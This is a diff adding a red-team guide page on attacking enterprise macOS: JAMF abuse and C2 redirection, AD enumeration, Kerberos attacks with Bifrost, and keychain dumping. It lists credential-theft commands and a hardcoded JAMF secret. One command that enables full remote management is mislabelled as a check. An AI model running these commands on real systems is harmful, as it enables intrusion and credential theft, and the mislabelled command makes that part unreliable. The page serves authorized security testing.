@@ -1,0 +1,228 @@
+---
+title: "macOS Red Teaming"
+description: "Red team techniques for macOS environments: MDM abuse, JAMF compromise, Active Directory integration, Kerberos attacks, and keychain access"
+---
+
+## Overview
+
+macOS red teaming differs significantly from Windows-focused engagements. Enterprise Macs are almost always managed by MDM solutions (JAMF, Kandji, Mosyle), frequently integrated with Active Directory, and often used with cloud service credentials. This page covers the most relevant attack paths.
+
+<Warning>
+This content is for authorized red team operations only. Always operate strictly within the defined scope of your engagement.
+</Warning>
+
+## Abusing MDM Solutions
+
+### Enumerating MDM Configuration
+
+```bash
+# Check JAMF connectivity
+jamf checkJSSConnection
+
+# Find MDM enrollment profile
+profiles show -all
+
+# List MDM-managed configuration profiles
+profiles list
+```
+
+### JAMF PRO Attacks
+
+<AccordionGroup>
+  <Accordion title="JAMF Self-Enrollment">
+    Check for self-enrollment at: `https://<company-name>.jamfcloud.com/enroll/`
+
+    If self-enrollment is enabled, it may ask for credentials. Use [JamfSniper.py](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfSniper.py) for password spraying.
+  </Accordion>
+
+  <Accordion title="JAMF Device Authentication Secrets">
+    The `jamf` binary historically contained a shared keychain secret: **`jk23ucnq91jfu9aj`**
+
+    JAMF persists as a LaunchDaemon at:
+    ```
+    /Library/LaunchAgents/com.jamf.management.agent.plist
+    ```
+  </Accordion>
+
+  <Accordion title="JAMF Device Takeover">
+    The JAMF server URL is stored in:
+    ```bash
+    plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist
+    # Look for: <key>jss_url</key>
+    ```
+
+    An attacker can drop a malicious package that overwrites this file, redirecting the device to a Mythic C2 listener:
+
+    ```bash
+    # After changing the URL, force immediate reconnection:
+    sudo jamf policy -id 0
+    ```
+  </Accordion>
+
+  <Accordion title="JAMF Impersonation">
+    Requirements for impersonating JAMF communications:
+
+    1. Device UUID: `ioreg -d2 -c IOPlatformExpertDevice | awk -F" '/IOPlatformUUID/{print $(NF-1)}'`
+    2. JAMF keychain: `/Library/Application Support/Jamf/JAMF.keychain` (contains device certificate)
+
+    With these, create a VM with the stolen UUID and cloned keychain.
+  </Accordion>
+
+  <Accordion title="Harvesting Secrets from JAMF Scripts">
+    Monitor `/Library/Application Support/Jamf/tmp/` for custom admin scripts — they are placed, executed, and removed. They often contain credentials:
+
+    ```bash
+    # Monitor JAMF script arguments (no root needed)
+    watch -n 1 'ps aux | grep -i jamf'
+    ```
+
+    Use [JamfExplorer.py](https://github.com/WithSecureLabs/Jamf-Attack-Toolkit/blob/master/JamfExplorer.py) to listen for new files and process arguments.
+  </Accordion>
+</AccordionGroup>
+
+### Using MDM as C2
+
+```bash
+# Install mobileconfig enrollment file (requires root)
+# Typically delivered as pkg, auto-decompressed by Safari when downloaded as zip
+# Once enrolled, device trusts the MDM's SSL cert — can sign any payload
+
+# Mythic agent Orthrus uses this technique
+```
+
+## Active Directory Integration
+
+Many macOS systems are bound to Active Directory. Standard AD enumeration applies, plus macOS-specific tools.
+
+### Domain Information
+
+```bash
+echo show com.apple.opendirectoryd.ActiveDirectory | scutil
+dsconfigad -show
+```
+
+### User Enumeration
+
+```bash
+# Local users
+dscl . ls /Users
+dscl . read /Users/<username>
+
+# AD domain users
+dscl "/Active Directory/TEST/All Domains" ls /Users
+dscl "/Active Directory/TEST/All Domains" read /Users/<username>
+dscacheutil -q user
+
+# Computers
+dscl "/Active Directory/TEST/All Domains" ls /Computers
+
+# Groups
+dscl . ls /Groups
+dscl "/Active Directory/TEST/All Domains" ls /Groups
+
+# Domain info
+dsconfigad -show
+```
+
+### macOS AD Attack Tools
+
+<CardGroup cols={3}>
+  <Card title="MacHound" icon="dog">
+    BloodHound extension for macOS — collects AD relationships including CanSSH, CanVNC, and CanAE edges.
+  </Card>
+  <Card title="Bifrost" icon="bridge">
+    Objective-C tool using native macOS Heimdal Kerberos APIs. No additional frameworks required on target.
+  </Card>
+  <Card title="Orchard" icon="apple">
+    JXA (JavaScript for Automation) tool for Active Directory enumeration from macOS.
+  </Card>
+</CardGroup>
+
+### Kerberos Attacks on macOS
+
+```bash
+# Request TGT hash (PKINIT)
+bifrost --action askhash --username <name> --password <password> --domain <domain>
+
+# Over-Pass-The-Hash: request TGT
+bifrost --action asktgt --username <user> --domain <domain.com> \
+       --hash <hash> --enctype <enctype> --keytab /path/to/keytab
+
+# Kerberoast
+bifrost --action asktgs --spn <service> --domain <domain.com> \
+       --username <user> --hash <hash> --enctype <enctype>
+
+# Access shares with obtained tickets
+smbutil view //computer.fqdn
+mount -t smbfs //server/folder /local/mount/point
+```
+
+### BloodHound MacHound Edges
+
+MacHound adds three new edges beyond standard HasSession and AdminTo:
+
+| Edge | Meaning |
+|------|---------|
+| `CanSSH` | Entity allowed to SSH to host |
+| `CanVNC` | Entity allowed to VNC to host |
+| `CanAE` | Entity allowed to execute AppleEvent scripts |
+
+## Accessing the macOS Keychain
+
+The Keychain stores sensitive information that can facilitate lateral movement:
+
+```bash
+# List keychains
+security list-keychains
+
+# Dump login keychain (may trigger user prompt)
+security dump-keychain ~/Library/Keychains/login.keychain-db
+
+# Find specific passwords (prompts user unless already unlocked)
+security find-generic-password -l "service_name" -w
+security find-internet-password -s "server.example.com" -w
+
+# Unlock keychain (useful in non-interactive sessions)
+security unlock-keychain -p <password> ~/Library/Keychains/login.keychain-db
+```
+
+## External Service Integration
+
+macOS environments frequently use:
+
+- **OneLogin** — synchronized credentials across services
+- **GitHub, AWS** — accessed via OneLogin
+- **Okta, Azure AD** — SSO integration
+
+Compromising macOS credentials often means compromising all connected cloud services simultaneously.
+
+## Safari Automatic Extraction
+
+When a file is downloaded in Safari, "safe" file types are **automatically opened**. A downloaded ZIP is automatically decompressed, potentially exposing the user to malicious content without an explicit open action.
+
+## macOS Remote Access and Protocols
+
+```bash
+# Check if SSH is running
+sudo launchctl list | grep ssh
+systemsetup -getremotelogin
+
+# Check VNC / ARD
+sudo /System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart \
+     -activate -configure -access -on -users admin -privs -all -restart -agent
+
+# Screen sharing
+netstat -an | grep 5900
+
+# AirDrop / Bonjour
+dns-sd -B _airdrop._tcp
+```
+
+## References
+
+- [Introducing MacHound — XMCyber](https://medium.com/xm-cyber/introducing-machound-a-solution-to-macos-active-directory-based-attacks-2a425f0a22b6)
+- [Active Directory Discovery with a Mac](https://its-a-feature.github.io/posts/2018/01/Active-Directory-Discovery-with-a-Mac/)
+- [Come to the Dark Side, We Have Apples (DEF CON Talk)](https://www.youtube.com/watch?v=pOQOh07eMxY)
+- [OBTS: An Attacker's Perspective on JAMF Configurations](https://www.youtube.com/watch?v=ju1IYWUv4ZA)
+- [Bifrost](https://github.com/its-a-feature/bifrost)
+- [Orchard](https://github.com/its-a-feature/Orchard)
